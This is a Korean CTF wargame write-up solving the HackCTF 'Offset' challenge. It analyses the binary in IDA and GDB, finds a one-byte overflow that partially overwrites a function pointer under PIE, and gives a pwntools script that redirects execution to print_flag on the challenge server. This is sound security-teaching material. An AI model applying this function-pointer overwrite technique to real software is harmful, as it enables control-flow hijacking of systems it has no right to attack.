# Offset

```c
kimdong@ubuntu  ~/Wargame  file offset
offset: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 3.2.0, BuildID[sha1]=c3936da4c051f1ca58585ee8b243bc9c4a37e437, not stripped

kimdong@ubuntu  ~/Wargame  checksec offset
[*] Checking for new versions of pwntools
   To disable this functionality, set the contents of /home/kimdong/.pwntools-cache-2.7/update to 'never'.
[*] You have the latest version of Pwntools (4.0.1)
[*] '/home/kimdong/Wargame/offset'
   Arch:     i386-32-little
   RELRO:    Full RELRO
   Stack:    No canary found
   NX:       NX enabled
   PIE:      PIE enabled
```
이번 바이너리 파일은 canary를 제외한 모든 보호기법이 걸려있는 32-bit 바이너리다.<br>
PIE란 `Position Independent Executable`의 약자로 Code영역을 포함한 모든 영역(Data,Heap,Stack,Libc)를 랜덤하게 매핑시키는 것이다.<br>

```c
kimdong@ubuntu  ~/Wargame  ./offset
Which function would you like to call?
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
[1]    2118 segmentation fault (core dumped)  ./offset
```
binary를 실행하면 문자열이 출력되고 사용자에게 입력값을 받는 형식이다.<br>

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s; // [esp+1h] [ebp-27h]
  int *v5; // [esp+20h] [ebp-8h]

  v5 = &argc;
  setvbuf(stdout, (char *)&dword_0 + 2, 0, 0);
  puts("Which function would you like to call?");
  gets(&s);
  select_func(&s);
  return 0;
}
```
ida로 main문을 분석해보면, 문자열이 출력되고 s라는 인자를 통해 사용자 입력값을 받고, select_func를 통해 특정 함수를 호출하는것 같다.<br>

```c
int __cdecl select_func(char *src)
{
  char dest; // [esp+Eh] [ebp-2Ah]
  int (*v3)(void); // [esp+2Ch] [ebp-Ch]

  v3 = two;
  strncpy(&dest, src, 0x1Fu);
  if ( !strcmp(&dest, "one") )
    v3 = one;
  return v3();
}
```
select_func 함수를 보면, strncpy를 통해 31byte만큼 dest에 복사한다.<br>
dest와 one을 비교하여 one인 경우에는 one을 리턴하고, 아닌 경우에는 v3를 그대로 리턴한다.<br>

```c
int print_flag()
{
  char i; // al
  FILE *fp; // [esp+Ch] [ebp-Ch]

  puts("This function is still under development.");
  fp = fopen("flag.txt", "r");
  for ( i = _IO_getc(fp); i != -1; i = _IO_getc(fp) )
    putchar(i);
  return putchar(10);
}
```
그다음으로 `print_flag()`함수를 보자.<br>
해당 함수는 flag.txt를 open해주는 함수이다.<br>
따라서 v3의 함수를 print_flag의 주소지로 변경시켜주면 문제를 해결할 수 있을것 같다.<br>
`select_func`에서 dest는 `ebp-0x2A(42)` v3는 `ebp-C(12)`로 둘 사이의 버퍼 시작 주소의 차이는 30byte이다.<br>
하지만 strncpy를 통해 덮어씌울수있는 크기는 31byte이므로, 1byte를 변경할수있다.<br>

```c
gef➤  disas select_func
Dump of assembler code for function select_func:
   0x0000077f <+0>:	push   ebp
   0x00000780 <+1>:	mov    ebp,esp
   0x00000782 <+3>:	push   ebx
   0x00000783 <+4>:	sub    esp,0x34
   0x00000786 <+7>:	call   0x5b0 <__x86.get_pc_thunk.bx>
   0x0000078b <+12>:	add    ebx,0x182d
   0x00000791 <+18>:	lea    eax,[ebx-0x190b]
   0x00000797 <+24>:	mov    DWORD PTR [ebp-0xc],eax
   0x0000079a <+27>:	sub    esp,0x4
   0x0000079d <+30>:	push   0x1f
   0x0000079f <+32>:	push   DWORD PTR [ebp+0x8]
   0x000007a2 <+35>:	lea    eax,[ebp-0x2a]
   0x000007a5 <+38>:	push   eax
   0x000007a6 <+39>:	call   0x550 <strncpy@plt>
   0x000007ab <+44>:	add    esp,0x10
   0x000007ae <+47>:	sub    esp,0x8
   0x000007b1 <+50>:	lea    eax,[ebx-0x1675]
   0x000007b7 <+56>:	push   eax
   0x000007b8 <+57>:	lea    eax,[ebp-0x2a]
   0x000007bb <+60>:	push   eax
   0x000007bc <+61>:	call   0x4d0 <strcmp@plt>
   0x000007c1 <+66>:	add    esp,0x10
   0x000007c4 <+69>:	test   eax,eax
   0x000007c6 <+71>:	jne    0x7d1 <select_func+82>
   0x000007c8 <+73>:	lea    eax,[ebx-0x1864]
   0x000007ce <+79>:	mov    DWORD PTR [ebp-0xc],eax
   0x000007d1 <+82>:	mov    eax,DWORD PTR [ebp-0xc]
   0x000007d4 <+85>:	call   eax
   0x000007d6 <+87>:	nop
   0x000007d7 <+88>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x000007da <+91>:	leave  
   0x000007db <+92>:	ret    
End of assembler dump.
```
`select_func`함수에서 v3를 호출하는 부분이 <+85>이다.<br>
여기서 breakpoint를 걸고 eax값을 확인해보자.<br>

 ```c
 $eax   : 0x56555600  →  <register_tm_clones+0> call 0x565556a9 <__x86.get_pc_thunk.dx>
$ebx   : 0x56556fb8  →  0x00001ec0
$ecx   : 0x6f      
$edx   : 0xffffd4fe  →  "aaaa"
$esp   : 0xffffd4f0  →  0x00000000
$ebp   : 0xffffd528  →  0xffffd568  →  0x00000000
$esi   : 0xf7fb8000  →  0x001d4d6c ("lM"?)
$edi   : 0x0       
$eip   : 0x565557d4  →  <select_func+85> call eax
$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffd4f0│+0x0000: 0x00000000	 ← $esp
0xffffd4f4│+0x0004: 0x0000000a
0xffffd4f8│+0x0008: 0x00000026 ("&"?)
0xffffd4fc│+0x000c: 0x616100c2
0xffffd500│+0x0010: 0x00006161 ("aa"?)
0xffffd504│+0x0014: 0x00000000
0xffffd508│+0x0018: 0x00000000
0xffffd50c│+0x001c: 0x00000000
──────────────────────────────────────────────────────────────────────────── code:x86:32 ────
   0x565557c3 <select_func+68> adc    BYTE PTR [ebp-0x72f68a40], al
   0x565557c9 <select_func+74> sbb    DWORD PTR [edi+eiz*8+0x4589ffff], 0xfffffff4
   0x565557d1 <select_func+82> mov    eax, DWORD PTR [ebp-0xc]
 → 0x565557d4 <select_func+85> call   eax
   0x565557d6 <select_func+87> nop    
   0x565557d7 <select_func+88> mov    ebx, DWORD PTR [ebp-0x4]
   0x565557da <select_func+91> leave  
   0x565557db <select_func+92> ret    
   0x565557dc <main+0>         lea    ecx, [esp+0x4]
```
`eax`에 0x56555600의 값이 들어있는것을 확인할수 있다.<br>

```c
gef➤  disas print_flag
Dump of assembler code for function print_flag:
   0x565556d8 <+0>:	push   ebp
```
print_flag의 주소는 `0x565556d8`로 기존 eax값의 뒤 한바이트만 바꿔주면 가능할것같다.<br>

---

## Exploit Code

```c
from pwn import *
p = remote("ctf.j0n9hyun.xyz",3007)
payload = "A"*30
payload += "\xd8"

p.recvuntil("Which function would you like to call?")
p.sendline(payload)
p.interactive()
```

```c
kimdong@ubuntu  ~/Wargame  python offset_ex.py
[+] Opening connection to ctf.j0n9hyun.xyz on port 3007: Done
[*] Switching to interactive mode

This function is still under development.
HackCTF{}
[*] Got EOF while reading in interactive
```

## END !
